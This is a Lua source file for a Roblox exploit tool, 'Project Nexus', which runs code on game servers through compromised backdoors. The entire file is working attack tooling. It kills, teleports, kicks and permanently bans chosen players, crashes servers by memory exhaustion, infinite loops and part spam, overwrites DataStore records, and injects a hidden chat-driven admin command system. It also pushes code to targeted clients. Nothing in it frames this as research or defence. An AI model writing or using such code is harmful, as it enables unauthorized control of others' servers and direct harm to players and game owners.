--[[
    Project Nexus - Serverside Executor Core
    Executes Lua code on the server through compromised backdoors
]]

local Executor = {}
Executor.__index = Executor

function Executor.new(backdoorConnection)
    local self = setmetatable({}, Executor)
    self.connection = backdoorConnection
    self.commandQueue = {}
    self.executionHistory = {}
    self.activeSession = true
    return self
end

-- Execute raw Lua code serverside
function Executor:Execute(code)
    if not self.activeSession then
        return false, "Session inactive"
    end
    
    local executionId = self:GenerateExecutionId()
    local timestamp = os.time()
    
    -- Wrap code with error handling
    local wrappedCode = [[
local success, result = pcall(function()
]] .. code .. [[
end)
return {success = success, result = tostring(result)}
]]
    
    -- Send to backdoor
    local success, response = pcall(function()
        return self.connection:Send(wrappedCode)
    end)
    
    -- Log execution
    table.insert(self.executionHistory, {
        id = executionId,
        code = code,
        timestamp = timestamp,
        success = success,
        response = response
    })
    
    return success, response
end

-- Execute command with specific privileges
function Executor:ExecuteAsServer(code)
    local serverWrapper = [[
local RunService = game:GetService("RunService")
if RunService:IsServer() then
]] .. code .. [[
end
]]
    return self:Execute(serverWrapper)
end

-- Mass player manipulation
function Executor:ExecuteOnAllPlayers(action)
    local code = [[
local Players = game:GetService("Players")
for _, player in ipairs(Players:GetPlayers()) do
    spawn(function()
        local character = player.Character
        if character then
]] .. action .. [[
        end
    end)
end
]]
    return self:Execute(code)
end

-- Workspace manipulation
function Executor:ManipulateWorkspace(operation)
    local code = [[
local Workspace = game:GetService("Workspace")
]] .. operation .. [[
]]
    return self:Execute(code)
end

-- Player targeting
function Executor:TargetPlayer(playerName, action)
    local code = string.format([[
local Players = game:GetService("Players")
local target = Players:FindFirstChild("%s")
if target then
    local character = target.Character
    if character then
]] .. action .. [[
    end
end
]], playerName)
    return self:Execute(code)
end

-- Common serverside functions
function Executor:KillPlayer(playerName)
    return self:TargetPlayer(playerName, [[
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    ]])
end

function Executor:TeleportPlayer(playerName, position)
    local x, y, z = position.X, position.Y, position.Z
    return self:TargetPlayer(playerName, string.format([[
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = CFrame.new(%d, %d, %d)
        end
    ]], x, y, z))
end

function Executor:GiveItem(playerName, itemId)
    return self:TargetPlayer(playerName, string.format([[
        local InsertService = game:GetService("InsertService")
        local item = InsertService:LoadAsset(%d)
        if item then
            item.Parent = character
        end
    ]], itemId))
end

function Executor:KickPlayer(playerName, reason)
    return self:Execute(string.format([[
        local Players = game:GetService("Players")
        local target = Players:FindFirstChild("%s")
        if target then
            target:Kick("%s")
        end
    ]], playerName, reason or "Kicked by Nexus"))
end

function Executor:BanPlayer(playerName)
    return self:Execute(string.format([[
        local Players = game:GetService("Players")
        local BanService = game:GetService("BanService")
        local target = Players:FindFirstChild("%s")
        if target then
            pcall(function()
                BanService:BanAsync({
                    UserIds = {target.UserId},
                    Duration = -1,
                    DisplayReason = "Banned",
                    PrivateReason = "External ban"
                })
            end)
            target:Kick("Banned")
        end
    ]], playerName))
end

-- Server crash functions
function Executor:CrashServer(method)
    local methods = {
        ["memory"] = [[
            -- Memory exhaustion
            local t = {}
            while true do
                table.insert(t, string.rep("X", 1000000))
            end
        ]],
        
        ["infinite_loop"] = [[
            -- Infinite tight loop
            while true do end
        ]],
        
        ["recursive"] = [[
            -- Stack overflow
            local function crash()
                crash()
            end
            crash()
        ]],
        
        ["part_spam"] = [[
            -- Part spam lag
            for i = 1, 100000 do
                local part = Instance.new("Part")
                part.Parent = workspace
            end
        ]],
    }
    
    return self:Execute(methods[method] or methods["memory"])
end

-- Game data manipulation
function Executor:ModifyDataStore(storeName, key, value)
    local code = string.format([[
        local DataStoreService = game:GetService("DataStoreService")
        local store = DataStoreService:GetDataStore("%s")
        pcall(function()
            store:SetAsync("%s", %s)
        end)
    ]], storeName, key, tostring(value))
    return self:Execute(code)
end

-- Fireserver remote exploit
function Executor:ExploitRemote(remotePath, ...)
    local args = {...}
    local argsString = ""
    for i, arg in ipairs(args) do
        if type(arg) == "string" then
            argsString = argsString .. '"' .. arg .. '"'
        else
            argsString = argsString .. tostring(arg)
        end
        if i < #args then
            argsString = argsString .. ", "
        end
    end
    
    local code = string.format([[
        local remote = game:GetService("%s")
        if remote then
            remote:FireServer(%s)
        end
    ]], remotePath, argsString)
    return self:Execute(code)
end

-- Admin command injection
function Executor:InjectAdminCommands()
    local adminCode = [[
-- Admin command system injection
local Players = game:GetService("Players")
local prefix = ":"

local commands = {
    kill = function(args, executor)
        local target = Players:FindFirstChild(args[1])
        if target and target.Character then
            target.Character.Humanoid.Health = 0
        end
    end,
    
    tp = function(args, executor)
        local target = Players:FindFirstChild(args[1])
        local dest = Players:FindFirstChild(args[2])
        if target and dest and target.Character and dest.Character then
            target.Character.HumanoidRootPart.CFrame = 
                dest.Character.HumanoidRootPart.CFrame
        end
    end,
    
    god = function(args, executor)
        local target = Players:FindFirstChild(args[1]) or executor
        if target and target.Character then
            target.Character.Humanoid.MaxHealth = math.huge
            target.Character.Humanoid.Health = math.huge
        end
    end,
    
    speed = function(args, executor)
        local target = Players:FindFirstChild(args[1]) or executor
        local speed = tonumber(args[2]) or 100
        if target and target.Character then
            target.Character.Humanoid.WalkSpeed = speed
        end
    end,
    
    respawn = function(args, executor)
        local target = Players:FindFirstChild(args[1])
        if target then
            target:LoadCharacter()
        end
    end,
}

-- Command listener
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        if msg:sub(1, 1) == prefix then
            local args = {}
            for arg in msg:sub(2):gmatch("%S+") do
                table.insert(args, arg)
            end
            
            local cmd = table.remove(args, 1)
            if commands[cmd] then
                spawn(function()
                    pcall(commands[cmd], args, player)
                end)
            end
        end
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        if msg:sub(1, 1) == prefix then
            local args = {}
            for arg in msg:sub(2):gmatch("%S+") do
                table.insert(args, arg)
            end
            
            local cmd = table.remove(args, 1)
            if commands[cmd] then
                spawn(function()
                    pcall(commands[cmd], args, player)
                end)
            end
        end
    end)
end)
]]
    return self:Execute(adminCode)
end

-- Script all players
function Executor:ExecuteOnPlayer(playerName, clientCode)
    local code = string.format([[
        local Players = game:GetService("Players")
        local target = Players:FindFirstChild("%s")
        if target then
            local remote = Instance.new("RemoteEvent")
            remote.Parent = game.ReplicatedStorage
            remote:FireClient(target, [==[%s]==])
            remote:Destroy()
        end
    ]], playerName, clientCode)
    return self:Execute(code)
end

-- Generate execution ID
function Executor:GenerateExecutionId()
    return string.format("%d_%d", os.time(), math.random(1000, 9999))
end

-- Get execution history
function Executor:GetHistory(limit)
    local history = {}
    local start = math.max(1, #self.executionHistory - (limit or 10) + 1)
    for i = start, #self.executionHistory do
        table.insert(history, self.executionHistory[i])
    end
    return history
end

-- Clear execution history
function Executor:ClearHistory()
    self.executionHistory = {}
end

-- Session control
function Executor:EndSession()
    self.activeSession = false
    self:ClearHistory()
end

return Executor
